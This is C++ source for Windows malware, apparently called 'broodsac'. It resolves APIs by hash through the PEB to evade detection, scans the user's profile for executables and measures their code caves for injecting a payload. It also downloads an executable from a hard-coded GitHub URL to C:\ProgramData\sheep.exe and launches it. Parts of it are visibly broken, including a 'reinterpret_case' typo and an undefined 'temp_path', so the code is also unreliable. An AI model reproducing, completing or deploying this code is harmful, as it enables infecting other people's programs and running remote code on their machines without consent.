#include <cstdint>
#include <iostream>
#include <string>

#include <windows.h>
#include <winternl.h>
#include <shlobj.h>

typedef struct FULL_PEB_LDR_DATA
{
   ULONG Length;
   BOOLEAN Initialized;
   HANDLE SsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   PVOID EntryInProgress;
   BOOLEAN ShutdownInProgress;
   HANDLE ShutdownThreadId;
} FULL_PEB_LDR_DATA, *PFULL_PEB_LDR_DATA;

typedef struct FULL_LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     PVOID EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;

typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
typedef void * (* mallocHeader)(std::size_t);
typedef void * (* reallocHeader)(void *, std::size_t);
typedef void (* freeHeader)(void *);
typedef char * (* strncatHeader)(char *, const char *, std::size_t);
typedef int (* strnicmpHeader)(const char *, const char *, std::size_t);
typedef std::size_t (* strlenHeader)(const char *);
typedef void * (* memcpyHeader)(void *, const void *, std::size_t);
typedef HANDLE (* FindFirstFileAHeader)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (* FindNextFileAHeader)(HANDLE, LPWIN32_FIND_DATAA);
typedef HRESULT (__stdcall *SHGetFolderPathAHeader)(HWND, int, HANDLE, DWORD, LPSTR);
typedef HINSTANCE (*ShellExecuteAHeader)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

std::uint32_t fnv321a(const char *string)
{
   std::uint32_t hashval = 0x811c9dc5;

   if (string == nullptr)
      return hashval;

   while (*string != 0)
   {
      hashval ^= *string++;
      hashval *= 0x1000193;
   }

   return hashval;
}

LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
{
   const IMAGE_NT_HEADERS *nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS *>(reinterpret_cast<const std::uint8_t *>(module)+module->e_lfanew);
   const IMAGE_EXPORT_DIRECTORY *export_directory = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY *>(
      reinterpret_cast<const std::uint8_t *>(module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
   const DWORD *name_pointers = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNames);
   const WORD *name_ordinals = reinterpret_cast<const WORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfNameOrdinals);
   const DWORD *functions = reinterpret_cast<const DWORD *>(reinterpret_cast<const std::uint8_t *>(module)+export_directory->AddressOfFunctions);

   for (std::uint32_t i=0; i<export_directory->NumberOfNames; ++i)
   {
      const char *name = reinterpret_cast<const char *>(reinterpret_cast<const std::uint8_t *>(module)+name_pointers[i]);

      if (fnv321a(name) != hash)
         continue;

      return reinterpret_cast<LPCVOID>(reinterpret_cast<const std::uint8_t *>(module)+functions[name_ordinals[i]]);
   }

   return nullptr;
}

int infect(void)
{
#if defined(BROODSAC32)
   PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
#elif defined(BROODSAC64)
   PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
   PLIST_ENTRY list_entry = ldr->InLoadOrderModuleList.Flink;
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = nullptr;

   while (list_entry != nullptr)
   {
      PFULL_LDR_DATA_TABLE_ENTRY table_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry);

      if (table_entry->BaseDllName.Buffer == nullptr)
      {
         list_entry = nullptr;
         continue;
      }

      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == 0x4e00520045004b) // L"KERN"
      {
         kernel32 = table_entry;
         break;
      }
      
      list_entry = table_entry->InLoadOrderLinks.Flink;
   }

   if (kernel32 == nullptr)
      return 1;

   LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
   FindFirstFileAHeader findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
   FindNextFileAHeader findNextFile = reinterpret_cast<FindNextFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x6f4d1398));
   char msvcrtDll[] = {'m','s','v','c','r','t','.','d','l','l',0};
   PIMAGE_DOS_HEADER msvcrtModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(msvcrtDll));
   mallocHeader malloc = reinterpret_cast<mallocHeader>(get_proc_by_hash(msvcrtModule, 0x558c274d));
   reallocHeader realloc = reinterpret_cast<reallocHeader>(get_proc_by_hash(msvcrtModule, 0xbf26b345));
   freeHeader free = reinterpret_cast<freeHeader>(get_proc_by_hash(msvcrtModule, 0x99b3eedb));
   strncatHeader strncat = reinterpret_cast<strncatHeader>(get_proc_by_hash(msvcrtModule, 0xb1ee6f2e));
   strnicmpHeader strnicmp = reinterpret_cast<strnicmpHeader>(get_proc_by_hash(msvcrtModule, 0x3b2c5b30));
   strlenHeader strlen = reinterpret_cast<strlenHeader>(get_proc_by_hash(msvcrtModule, 0x58ba3d97));
   memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
   SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
   
   char *profile_directory = reinterpret_cast<char *>(malloc(MAX_PATH+1));

   if (getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
      return 2;

   char prepend_path[] = {'\\', '\\', '?', '\\', 0};
   std::size_t root_size = strlen(prepend_path)+strlen(profile_directory)+1;
   char *search_root = reinterpret_cast<char *>(malloc(root_size));
   memcpy(search_root, prepend_path, strlen(prepend_path)+1);
   strncat(search_root, profile_directory, strlen(profile_directory));

   /* create a stack of directory names to traverse */
   std::size_t search_stack_size = 1;
   char **search_stack = reinterpret_cast<char **>(malloc(sizeof(char *) * search_stack_size));
   search_stack[0] = search_root;

   std::size_t found_executables_size = 0;
   char **found_executables = nullptr;

   while (search_stack_size > 0)
   {
      char *search_visit = search_stack[0];
      char starSearch[] = {'\\','*',0};
      char exeSearch[] = {'.','e','x','e',0};
      --search_stack_size;

      if (search_stack_size == 0)
      {
         free(search_stack);
         search_stack = nullptr;
      }
      else
      {
         memcpy(&search_stack[0], &search_stack[1], sizeof(char *) * search_stack_size);
         search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
      }

      char *search_string = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(starSearch)+1));
      memcpy(search_string, search_visit, strlen(search_visit)+1);
      strncat(search_string, starSearch, strlen(starSearch));
      
      WIN32_FIND_DATAA find_data;
      HANDLE find_handle = findFirstFile(search_string, &find_data);

      if (find_handle == INVALID_HANDLE_VALUE)
         goto free_and_continue;

      do
      {
         char slash[] = {'\\',0};
         char dot[] = {'.', 0};
         char dotDot[] = {'.', '.', 0};

         if (strnicmp(find_data.cFileName, dot, 2) == 0 || strnicmp(find_data.cFileName, dotDot, 3) == 0)
            continue;
         else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
                  (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400)
         {
            char *new_directory = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
            memcpy(new_directory, search_visit, strlen(search_visit)+1);
            strncat(new_directory, slash, strlen(slash));
            strncat(new_directory, find_data.cFileName, strlen(find_data.cFileName));

            ++search_stack_size;
            
            if (search_stack == nullptr)
               search_stack = reinterpret_cast<char **>(malloc(sizeof(char *) * search_stack_size));
            else
               search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
            
            search_stack[search_stack_size-1] = new_directory;
         }
         else if (strnicmp(find_data.cFileName+(strlen(find_data.cFileName)-4), exeSearch, strlen(exeSearch)) == 0)
         {
            char *found_executable = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
            memcpy(found_executable, search_visit, strlen(search_visit)+1);
            strncat(found_executable, slash, strlen(slash));
            strncat(found_executable, find_data.cFileName, strlen(find_data.cFileName));

            ++found_executables_size;
            
            if (found_executables == nullptr)
               found_executables = reinterpret_cast<char **>(malloc(sizeof(char *) * found_executables_size));
            else
               found_executables = reinterpret_cast<char **>(realloc(found_executables, sizeof(char *) * found_executables_size));

            found_executables[found_executables_size-1] = found_executable;
         }
      } while (findNextFile(find_handle, &find_data));

   free_and_continue:
      free(search_string);
      free(search_visit);
   }

   std::wcout << found_executables_size << " executables were found." << std::endl;

   for (std::size_t i=0; i<found_executables_size; ++i)
   {
      char *executable = found_executables[i];
      HANDLE exe_handle = CreateFileA(executable,
                                      GENERIC_READ,
                                      0,
                                      nullptr,
                                      OPEN_EXISTING,
                                      FILE_ATTRIBUTE_NORMAL,
                                      nullptr);

      if (exe_handle == INVALID_HANDLE_VALUE)
      {
         std::wcout << "\tFailed to open " << executable << std::endl;
         goto end_exe_loop;
      }

      DWORD file_size = GetFileSize(exe_handle, nullptr);

      if (file_size == INVALID_FILE_SIZE)
      {
         std::wcout << "\t" << executable << " is larger than 4gb" << std::endl;
         goto close_file;
      }

      std::uint8_t *exe_buffer = reinterpret_cast<std::uint8_t *>(malloc(file_size));
      DWORD bytes_read = 0;

      if (!ReadFile(exe_handle, exe_buffer, file_size, &bytes_read, nullptr))
      {
         std::wcout << "\tFailed to read " << executable << std::endl;
         goto free_file;
      }

      IMAGE_DOS_HEADER *dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(exe_buffer);
      IMAGE_NT_HEADERS32 *nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS32>(exe_buffer+dos_header->e_lfanew);
      std::size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
      IMAGE_SECTION_HEADER *section_table = reinterpret_cast<PIMAGE_SECTION_HEADER>(exe_buffer+dos_header->e_lfanew+nt_headers_size);

      std::wcout << "\tScanning " << executable << "..." << std::endl;

      for (std::size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
      {
         IMAGE_SECTION_HEADER *section = &section_table[i];

         if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE)
            continue;

         std::uint8_t *section_end = exe_buffer+section->PointerToRawData+section->SizeOfRawData;
         std::uint8_t *cave_begin = section_end-1;

         while (*cave_begin == 0)
            --cave_begin;
         
         std::wcout << "\t\tFound code section " << reinterpret_cast<char *>(&section->Name) << " with cave size " << static_cast<std::uintptr_t>(section_end - cave_begin) << std::endl;
      }
      
      /*
      if (nt_headers->OptionalHeader.Machine == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
      {
         /* drop 64-bit payload 
      }
      else
      {
         /* drop 32-bit payload
      }
      */
      
      /* check to see if it's a 32-bit PE file or a 64-bit PE file and create pointers as necessary
         check the section table for executable sections
         determine the size of the code caves, if any
      */

   free_file:
      free(exe_buffer);
      exe_buffer = nullptr;

   close_file:
      CloseHandle(exe_handle);
      
   end_exe_loop:
      free(found_executables[i]);
   }

   free(found_executables);
   free(profile_directory);

   return 0;
}

void callback(void)
{
   return;
}

int callout(void)
{
   /* TODO pushad at the top of the function */
   
   void (*entrypoint)() = callback;
#if defined(BROODSAC32)
   PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
#elif defined(BROODSAC64)
   PPEB peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = reinterpret_cast<PFULL_PEB_LDR_DATA>(peb->Ldr);
   PFULL_LDR_DATA_TABLE_ENTRY list_entry = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(ldr->InLoadOrderModuleList.Flink);
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
   LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
   GetFileAttributesAHeader getFileAttributes = reinterpret_cast<GetFileAttributesAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xda1a7563));
   char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
   PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
   URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xd8d746fc));
   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
   ShellExecuteAHeader shellExecute = reinterpret_cast<ShellExecuteAHeader>(get_proc_by_hash(shell32Module, 0xb0ff5bf));

   char sheep[] = {'C',':','\\','P','r','o','g','r','a','m','D','a','t','a','\\','s','h','e','e','p','.','e','x','e',0};
   
   if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
   {
      if (urlDownloadToFile(nullptr,
                            "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
                            sheep,
                            0,
                            nullptr) != 0)
         return 2;
   }

   if (reinterpret_cast<INT_PTR>(shellExecute(nullptr, nullptr, temp_path, nullptr, nullptr, 1)) <= 32)
      return 3;
   
   return 0;
}

int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
   //infect();
   return callout();
}
